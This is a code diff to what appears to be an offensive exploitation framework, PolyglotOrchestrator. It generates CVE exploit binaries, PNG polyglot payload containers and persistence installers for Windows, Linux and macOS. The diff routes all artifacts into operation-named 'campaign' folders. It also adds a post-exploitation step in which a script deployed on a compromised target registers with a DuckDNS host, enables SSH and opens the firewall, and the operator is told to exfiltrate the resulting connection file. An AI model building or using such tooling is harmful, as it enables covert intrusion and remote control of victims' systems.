@@ -62,9 +62,46 @@ class PolyglotOrchestrator:
         self.duckdns = None  # Initialize on demand
 
         # Operation tracking (Vault7-style)
-        self.operation_id = self.opsec.generate_operation_id("POLYGOTTEM")
+        self.operation_id = self.opsec.generate_operation_id("CHIMERA")
         self.artifacts = []
         self.operation_start = datetime.now()
+
+        # Campaign directory (named after operation ID)
+        self.campaign_dir = self._init_campaign_directory()
+
+    def _init_campaign_directory(self) -> str:
+        """
+        Initialize campaign directory for artifacts
+
+        Creates a directory named after the operation ID (e.g., CHIMERA_20251115_093000)
+        in the project root to store all generated artifacts.
+
+        Returns:
+            Path to campaign directory
+        """
+        import pathlib
+
+        # Get project root (parent of tools directory)
+        project_root = pathlib.Path(__file__).parent.parent
+
+        # Create campaign directory
+        campaign_dir = project_root / self.operation_id
+        campaign_dir.mkdir(exist_ok=True)
+
+        return str(campaign_dir)
+
+    def _campaign_path(self, filename: str) -> str:
+        """
+        Get full path for file in campaign directory
+
+        Args:
+            filename: Just the filename (e.g., "exploit.bin")
+
+        Returns:
+            Full path in campaign directory
+        """
+        import pathlib
+        return str(pathlib.Path(self.campaign_dir) / filename)
 
     def run_interactive(self):
         """Run full interactive workflow with smart workflow selection"""
@@ -209,7 +246,7 @@ class PolyglotOrchestrator:
 
         # Generate exploit
         self.tui.info(f"Generating exploit for {cve_id}...")
-        output_file = f"exploit_{cve_id.replace('-', '_')}.bin"
+        output_file = self._campaign_path(f"exploit_{cve_id.replace('-', '_')}.bin")
 
         try:
             # Create shellcode placeholder
@@ -277,7 +314,7 @@ class PolyglotOrchestrator:
         custom_file_path = custom_file if custom_file and os.path.isfile(custom_file) else None
 
         # Generate polyglot
-        output_file = f"polyglot_{platform.value}_{polyglot_type}.png"
+        output_file = self._campaign_path(f"polyglot_{platform.value}_{polyglot_type}.png")
         self.tui.info(f"Generating {polyglot_type} polyglot...")
 
         try:
@@ -338,7 +375,7 @@ class PolyglotOrchestrator:
 
             # Generate multiple artifacts
             for i, cve_id in enumerate(best_chain['cves'], 1):
-                output_file = f"stage{i}_{cve_id.replace('-', '_')}.bin"
+                output_file = self._campaign_path(f"stage{i}_{cve_id.replace('-', '_')}.bin")
                 self.tui.info(f"Generating stage {i}/{len(best_chain['cves'])}...")
 
                 try:
@@ -386,7 +423,7 @@ class PolyglotOrchestrator:
         # Prompt for PNG container
         custom_png = self._prompt_custom_file("PNG container")
 
-        output_file = "5AF0PfnN_replica.png"
+        output_file = self._campaign_path("5AF0PfnN_replica.png")
         self.tui.info("Generating APT-41 polyglot (this may take a moment)...")
 
         try:
@@ -463,7 +500,7 @@ class PolyglotOrchestrator:
 
                 if self.menu.confirm("Generate artifacts?", default=True):
                     for i, cve_id in enumerate(chain['cves'], 1):
-                        output_file = f"{platform.value}_stage{i}_{cve_id.replace('-', '_')}.bin"
+                        output_file = self._campaign_path(f"{platform.value}_stage{i}_{cve_id.replace('-', '_')}.bin")
                         shellcode = b'\x90' * 256
                         exploit_data = self.exploit_gen.generate(cve_id, shellcode)
 
@@ -596,7 +633,7 @@ public class CPUDesync {
 '''
 
         # Save PowerShell script
-        ps_script_path = "cpu_desync_windows.ps1"
+        ps_script_path = self._campaign_path("cpu_desync_windows.ps1")
         with open(ps_script_path, 'w') as f:
             f.write(powershell_script)
 
@@ -610,7 +647,7 @@ copy /y cpu_desync_windows.ps1 "C:\\ProgramData\\cpu_desync_windows.ps1" >nul 2>
 powershell.exe -ExecutionPolicy Bypass -File "C:\\ProgramData\\cpu_desync_windows.ps1"
 '''
 
-        installer_path = "install_cpu_desync_windows.bat"
+        installer_path = self._campaign_path("install_cpu_desync_windows.bat")
         with open(installer_path, 'w') as f:
             f.write(service_installer)
 
@@ -755,7 +792,7 @@ int main(void) {
 }
 '''
 
-        c_source_path = "cpu_desync_linux.c"
+        c_source_path = self._campaign_path("cpu_desync_linux.c")
         with open(c_source_path, 'w') as f:
             f.write(c_program)
 
@@ -782,7 +819,7 @@ Nice=-20
 WantedBy=sysinit.target
 '''
 
-        service_path = "cpu-desync-test.service"
+        service_path = self._campaign_path("cpu-desync-test.service")
         with open(service_path, 'w') as f:
             f.write(systemd_service)
 
@@ -801,7 +838,7 @@ sudo systemctl enable cpu-desync-test.service 2>/dev/null
 sudo /usr/local/bin/cpu_desync_linux
 '''
 
-        installer_path = "install_cpu_desync_linux.sh"
+        installer_path = self._campaign_path("install_cpu_desync_linux.sh")
         with open(installer_path, 'w') as f:
             f.write(install_script)
 
@@ -967,7 +1004,7 @@ int main(int argc, char *argv[]) {
 '''
 
         # Save C source
-        cascade_c_path = "linux_cve_cascade.c"
+        cascade_c_path = self._campaign_path("linux_cve_cascade.c")
         with open(cascade_c_path, 'w') as f:
             f.write(cascade_payload)
 
@@ -991,7 +1028,7 @@ int main(int argc, char *argv[]) {
             cascade_binary = cascade_payload.encode()
 
         # Create PNG polyglot container
-        png_path = "linux_cascade.png"
+        png_path = self._campaign_path("linux_cascade.png")
 
         if custom_png and os.path.isfile(custom_png):
             # Use custom PNG as container
@@ -1125,7 +1162,7 @@ fi
 rm -f /tmp/.cascade 2>/dev/null
 '''
 
-        exec_script_path = "execute_linux_cascade.sh"
+        exec_script_path = self._campaign_path("execute_linux_cascade.sh")
         with open(exec_script_path, 'w') as f:
             f.write(exec_script)
 
@@ -1344,7 +1381,7 @@ sudo /usr/local/bin/cpu_desync_macos
         custom_file_path = custom_file if custom_file and os.path.isfile(custom_file) else None
 
         # Generate polyglot with single exploit
-        output_file = f"polyglot_{cve_id.replace('-', '_')}_{polyglot_type}.png"
+        output_file = self._campaign_path(f"polyglot_{cve_id.replace('-', '_')}_{polyglot_type}.png")
         self.tui.info(f"Packaging exploit into {polyglot_type} polyglot...")
 
         try:
@@ -1386,7 +1423,7 @@ sudo /usr/local/bin/cpu_desync_macos
         custom_file_path = custom_file if custom_file and os.path.isfile(custom_file) else None
 
         # Generate polyglot with chain
-        output_file = f"campaign_{platform.value}_{polyglot_type}.png"
+        output_file = self._campaign_path(f"campaign_{platform.value}_{polyglot_type}.png")
         self.tui.info(f"Packaging {len(cve_list)} exploits into {polyglot_type} polyglot...")
 
         try:
@@ -1424,6 +1461,7 @@ sudo /usr/local/bin/cpu_desync_macos
         headers = ["Metric", "Value"]
         rows = [
             ["Operation ID", self.operation_id],
+            ["Campaign Directory", self.campaign_dir],
             ["Duration", f"{operation_duration.total_seconds():.1f}s"],
             ["Artifacts Generated", str(len(self.artifacts))],
             ["OpSec Applied", "Yes" if self.artifacts else "N/A"],
@@ -1431,14 +1469,28 @@ sudo /usr/local/bin/cpu_desync_macos
 
         self.tui.table(headers, rows)
 
+        # Campaign directory info
+        print()
+        self.tui.success(f"📁 All artifacts saved to: {self.campaign_dir}")
+        print()
+
         # Artifact list
         if self.artifacts:
             self.tui.info("Generated Artifacts:")
             for artifact in self.artifacts:
-                size_kb = os.path.getsize(artifact) / 1024
-                self.tui.list_item(f"{artifact} ({size_kb:.1f} KB)", level=1)
+                # Show relative path from campaign dir
+                import pathlib
+                try:
+                    rel_path = pathlib.Path(artifact).relative_to(self.campaign_dir)
+                    artifact_display = str(rel_path)
+                except ValueError:
+                    artifact_display = artifact
 
-        self.tui.success(f"Operation {self.operation_id} complete!")
+                size_kb = os.path.getsize(artifact) / 1024
+                self.tui.list_item(f"{artifact_display} ({size_kb:.1f} KB)", level=1)
+
+        print()
+        self.tui.success(f"✓ Operation {self.operation_id} complete!")
 
     def _offer_duckdns_registration(self):
         """Offer DuckDNS registration and SSH setup"""
@@ -1446,57 +1498,58 @@ sudo /usr/local/bin/cpu_desync_macos
         print()
         self.tui.section("🌐 Remote Access Setup")
 
-        self.tui.info("Enable remote SSH access via DuckDNS?")
-        self.tui.list_item("Register IP with polygottem.duckdns.org", level=1)
-        self.tui.list_item("Setup SSH server for remote access", level=1)
-        self.tui.list_item("Get connection information", level=1)
+        self.tui.info("Generate post-exploitation script for TARGET?")
+        self.tui.list_item("Deploy script to compromised target", level=1)
+        self.tui.list_item("Target registers its IP with DuckDNS", level=1)
+        self.tui.list_item("Target enables SSH server", level=1)
+        self.tui.list_item("Receive connection information", level=1)
         print()
 
-        if self.menu.confirm("Setup remote access?", default=False):
+        if self.menu.confirm("Generate target remote access script?", default=False):
             try:
-                # Generate random port for security
-                random_port = DuckDNSIntegration.generate_random_port()
+                import shutil
+                import pathlib
+
+                # Copy target DuckDNS setup script to campaign directory
+                source_script = pathlib.Path(__file__).parent / "target_duckdns_setup.py"
+                dest_script = pathlib.Path(self.campaign_dir) / "target_duckdns_setup.py"
+
+                shutil.copy2(source_script, dest_script)
+
+                # Make it executable
+                os.chmod(dest_script, 0o755)
+
+                # Track artifact
+                self.artifacts.append(str(dest_script))
 
                 print()
-                self.tui.section("🔒 SSH Port Configuration")
-                self.tui.warning("SECURITY: Using non-standard port to reduce attack surface")
-                self.tui.info(f"Generated random port: {random_port}")
+                self.tui.success(f"✓ Target script generated: {dest_script}")
                 print()
 
-                # Prompt for SSH port with random default
-                port_input = self.menu.prompt_input(
-                    f"SSH port (Press Enter for random {random_port}, or specify custom)",
-                    default=str(random_port)
-                )
-
-                try:
-                    ssh_port = int(port_input) if port_input else random_port
-                    if ssh_port < 1 or ssh_port > 65535:
-                        self.tui.warning(f"Invalid port {ssh_port}, using random {random_port}")
-                        ssh_port = random_port
-                except ValueError:
-                    self.tui.warning(f"Invalid port '{port_input}', using random {random_port}")
-                    ssh_port = random_port
-
-                # Show selected port prominently
+                # Show deployment instructions
+                self.tui.section("📋 Deployment Instructions")
+                self.tui.info("After initial exploitation, deploy this script to the TARGET:")
                 print()
-                self.tui.section(f"📡 Selected SSH Port: {ssh_port}")
-                if ssh_port == 22:
-                    self.tui.warning("⚠ Port 22 is heavily scanned! Consider using non-standard port.")
-                else:
-                    self.tui.success(f"✓ Using secure non-standard port: {ssh_port}")
+                self.tui.key_value("Script Location", str(dest_script), 20)
                 print()
-
-                # Initialize DuckDNS with selected port
-                self.duckdns = DuckDNSIntegration(ssh_port=ssh_port)
-
-                # Register and connect
-                self.duckdns.register_and_connect()
+                self.tui.info("On TARGET, run:")
+                self.tui.list_item(f"python3 target_duckdns_setup.py", level=1)
+                self.tui.list_item("or", level=1)
+                self.tui.list_item(f"chmod +x target_duckdns_setup.py && ./target_duckdns_setup.py", level=1)
+                print()
+                self.tui.info("The script will:")
+                self.tui.list_item("Detect target's public IP", level=1)
+                self.tui.list_item("Register with DuckDNS (polygottem.duckdns.org)", level=1)
+                self.tui.list_item("Enable SSH server on target", level=1)
+                self.tui.list_item("Configure firewall on target", level=1)
+                self.tui.list_item("Save connection info to /tmp/.polygottem_target_info.json", level=1)
+                print()
+                self.tui.warning("⚠ OPSEC: Exfiltrate /tmp/.polygottem_target_info.json from target to get SSH connection details")
+                print()
 
             except Exception as e:
-                self.tui.error(f"Remote access setup failed: {e}")
-                self.tui.info("You can manually setup later with:")
-                self.tui.list_item("python3 tools/duckdns_integration.py --full", level=1)
+                self.tui.error(f"Failed to generate target script: {e}")
+                self.tui.info("Script location: tools/target_duckdns_setup.py")
         else:
             self.tui.info("Skipping remote access setup")
 
